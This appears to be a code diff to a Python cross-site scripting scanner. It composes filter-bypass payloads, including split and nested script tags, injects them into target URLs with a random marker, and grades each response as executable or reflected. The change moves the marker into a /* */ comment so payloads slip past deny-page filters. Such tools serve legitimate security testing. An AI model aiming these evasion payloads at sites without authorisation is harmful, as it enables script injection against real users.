@@ -597,7 +597,10 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False, fn_cap=2):
                                 "case-mutated script tag", "tag_removed")
                     for s in rsplit[:3]:
                         for fn in jfuncs[:fn_cap] or rebuild_fn(s):
-                            add(f"{split_str('<script>', s)} {marker}>{fn}"
+                            # marker must sit inside a /* */ comment here:
+                            # the split tag already closed, so a bare
+                            # marker>fn becomes `ident > fn` -> dead code.
+                            add(f"{split_str('<script>', s)}{fn}/*{marker}*/"
                                 f"{split_str('</script>', s)}",
                                 f"nested tag-strip bypass ({s} splitter)", "tag_removed")
             for tag, ev, extra, deps in TAG_HANDLERS:
@@ -932,14 +935,17 @@ def _locate_anchor(body, marker, marked):
     return None, ""
 
 
-def classify_response(status, headers, body, payload, marker):
+def classify_response(status, headers, body, payload, marker, marked=None):
     """Grade one fetched response. Flow:
       blocked? -> marker/core anchor? -> executable position? -> JS ctx:
       surviving call inside payload span? -> V / V-truncated / R / none.
-    Pure function over (status, headers, body) so every branch is testable."""
-    marked = payload.replace("vvm{id}", marker)
-    if "vvm" not in marked:
-        marked += f"<!--{marker}-->"
+    Pure function over (status, headers, body) so every branch is testable.
+    `marked` = the exact string sent (caller picks the marker tail); when
+    omitted the legacy <!-- --> tail is assumed."""
+    if marked is None:
+        marked = payload.replace("vvm{id}", marker)
+        if "vvm" not in marked:
+            marked += f"<!--{marker}-->"
     core = _core_payload(marked, marker)
     csp = headers.get("content-security-policy", "")
     csp_note = ""
@@ -988,8 +994,12 @@ def classify_response(status, headers, body, payload, marker):
         import js_verify
         from html import unescape
         intended = js_verify.extract_intended_js(core)
-        needles = [intended] + ([unescape(intended)]
-                               if unescape(intended) != intended else [])
+        # a /*{marker}*/ tail strips to an empty /**/ husk in `core`, but the
+        # reflected attr keeps the marker — offer the husk-free needle too
+        husk = re.sub(r"/\*\s*\*/", "", intended)
+        needles = [intended] + ([husk] if husk != intended else []) \
+            + ([unescape(intended)]
+               if unescape(intended) != intended else [])
         for _tag, _attr, val in chk.attr_hits:
             uv = unescape(val)
             for nd in needles:
@@ -1006,8 +1016,10 @@ def classify_response(status, headers, body, payload, marker):
         import js_verify
         from html import unescape
         intended = js_verify.extract_intended_js(core)
-        needles = [intended] + ([unescape(intended)]
-                               if unescape(intended) != intended else [])
+        husk = re.sub(r"/\*\s*\*/", "", intended)
+        needles = [intended] + ([husk] if husk != intended else []) \
+            + ([unescape(intended)]
+               if unescape(intended) != intended else [])
         for _tag, _attr, val in chk.url_hits:
             uv = unescape(val)
             body_js = re.sub(r"^\s*(?:javascript|data:text/html[^,]*,)\s*",
@@ -1027,15 +1039,17 @@ def classify_response(status, headers, body, payload, marker):
             "evidence": chk.evidence + csp_note}
 
 
-def verify_payload(url, payload, render=False):
+def verify_payload(url, payload, render=False, comment_ok=True):
     """Inject payload with marker; grade V (executable) or R (reflected).
     render=True fetches via headless chromium — needed when the reflection
     lives only in the DOM (document.write/innerHTML sinks), and captures
-    real execution via hooked alert/confirm/prompt/print calls."""
+    real execution via hooked alert/confirm/prompt/print calls.
+    comment_ok=False picks a /* */ tail instead of <!-- --> — deny-page
+    filters (strpos + die on <>) would otherwise kill the marker itself."""
     marker = "vvm" + "".join(secrets.choice(string.ascii_lowercase) for _ in range(6))
     marked = payload.replace("vvm{id}", marker)
     if "vvm" not in marked:
-        marked += f"<!--{marker}-->"
+        marked += f"<!--{marker}-->" if comment_ok else f"/*{marker}*/"
     target = url.replace(PLACEHOLDER, quote(marked, safe=""))
 
     if render:
@@ -1076,7 +1090,7 @@ def verify_payload(url, payload, render=False):
     except Exception as e:
         return {"payload": marked, "confidence": "error", "evidence": str(e)}
     status, headers, body = _parse_response(raw)
-    return classify_response(status, headers, body, payload, marker)
+    return classify_response(status, headers, body, payload, marker, marked)
 
 
 # --- main --------------------------------------------------------------------
@@ -1149,6 +1163,10 @@ def main():
         kw = kw_by_refl.get(rid, {})
         kwv = kwv_by_refl.get(rid, {})
         quote_ch = detect_quote(source_html, "testing1")
+        # bisect-attributed rows (reflection_index 0) come from a deny page
+        # with no reflection — the baseline probe carries the real quote
+        if rid == 0 and analysis.get("attribution_quote"):
+            quote_ch = analysis["attribution_quote"]
         cand = compose(ctx, quote_ch, scores, kw, kwv, inert=inert)
         # rank on equal efficiency: direct payloads execute as-is;
         # splitter probes test THIS filter's actual deletion set;
@@ -1197,13 +1215,19 @@ def main():
                 # dead signatures.
                 seen, verified = set(), []
                 cap, wave = 2, cand
+                # deny-page filters kill the marker itself when the <!-- -->
+                # tail carries <>: fall back to a /* */ comment tail — it
+                # lands inert inside handlers/attrs and survives strpos lists
+                comment_ok = usable("<", scores) and usable(">", scores)
                 while wave:
                     found = False
                     for c in wave:
                         if c["payload"] in seen:
                             continue
                         seen.add(c["payload"])
-                        v = verify_payload(args.url, c["payload"], render=render)
+                        v = verify_payload(args.url, c["payload"],
+                                           render=render,
+                                           comment_ok=comment_ok)
                         verified.append(v)
                         if v["confidence"] == "V":
                             found = True
